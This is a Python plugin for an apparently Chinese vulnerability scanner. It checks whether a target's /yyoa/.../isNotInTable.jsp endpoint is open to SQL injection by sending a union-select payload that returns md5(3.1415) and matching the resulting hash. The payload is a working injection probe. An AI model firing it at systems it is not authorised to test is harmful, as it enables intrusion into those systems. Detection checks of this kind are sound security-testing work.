#!/usr/bin/env python
# coding : utf-8
# author : 'Zend'
# team   : "gogobirds"

from plugins.base import register_plugin, pluginmap
from pprint import pprint
from libs.utils import http


info = {
    'app_name': "test",
    'version': "0.1",
    'type': "test",
    'desc': "test is test",
}

plugin_info = (info['app_name'], info['version'], info['type'], info['desc'])


@register_plugin(plugin_info)
def func(args):
    pprint(info)
    payload = '''/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select md5(3.1415)#'''
    verify_url = args.url + payload
    res = http.request(verify_url)
    if res.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in res.content:
        args.result = "access"
    return args


if __name__ == "__main__":
    pluginmap["test"]()
